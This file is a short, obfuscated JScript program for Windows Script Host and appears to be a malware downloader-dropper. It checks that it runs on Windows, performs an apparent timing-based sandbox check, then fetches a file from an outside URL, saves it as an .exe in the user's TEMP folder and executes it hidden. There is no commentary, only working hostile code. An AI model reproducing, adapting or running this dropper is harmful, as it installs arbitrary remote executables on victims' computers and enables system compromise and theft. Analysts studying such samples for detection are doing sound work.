var _KB = false;
var _Q = "CreateObject";
var _KJ = function _LQ() {return WScript[_Q]("WScript"+".Shell");}(), _MQ = 11;
var _MS = "MSXML2.XMLHTTP";
var _F0 = 2123213;
var _FZ = 0;
function _X(_NX){_KJ["Run"](_NX, _FZ, _FZ);};
function _VF(){return _MS + "";};
function _D0(_X2, _C){_FZ = _FZ * 1; return _X2 - _C;};
function _D(){return _Q;};
/*@cc_on
  @if (@_win32 || @_win64)
    _KB = true;
  @end
@*/
if (_KB)
{
var _F = "";
function _FU(){return 22;};
var _X1 = 0; var _ET = 0;
function _NH()
{
var _X0 = new this["Date"]();
var _R = _X0["getUTCMilliseconds"]();
WScript["Sleep"](_FU());
var _X0 = new this["Date"]();
var _J1 = _X0["getUTCMilliseconds"]();
WScript["Sleep"](_FU());
var _X0 = new this["Date"]();
var _LI = _X0["getUTCMilliseconds"]();
var _X1 = "_PN";
_X1 = _D0(_J1, _R);
var _ET = "_V";
_ET = _D0(_LI, _J1);
_F = "open";
return _D0(_X1, _ET);
}
var _HY = false;
var _K = false;
for (var _FA = _FZ; _FA < _FU() * 1; _FA++){if (_NH() != _FZ){
_HY = true; 
_ET = "31" + 11 * _X1 + _ET; 
_K = true; 
break;
}}
function _J() {return ((_HY == true) && (_HY == _K)) ? 1 : _FZ;};
if (_HY && _J() && _K){
function _WX() {return _KJ["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "UNI2iX8zM8rtpsz.ex" + "e";};
 _KI = _VF();
 _KM = WScript[_Q](_KI);
 var _I = 1;
 while (_I){
try {
	if (_I == 1)
	{
		_KM[_F]("GET", "http://itead-europe.com/k3ias", false);
		_KM["send"]();
		_SY = "Sleep";
	}
	WScript[_SY](_FU() + 120); 
	if (_KM["readystate"] < 2 * 2) continue;
	_I = _FZ;
	function _J0(_O) {var _FO = (1, 2, 3, 4, 5, _O); return _FO;};
	_YA = WScript[_D()]("ADODB.Stream");
	_KI = _YA;
	_KI[_F]();
	_KI["type"] = _J0(1);
	_KI["write"](_KM["ResponseBody"]);
	_YA["position"] = _J0(_FZ);
	_KI["Save" + "ToFile"](_WX(), 2);
	_YA["cl"+"ose"]();
	_XY = _WX();
	_X(_XY);
} catch(_Q0){};
}
}
}

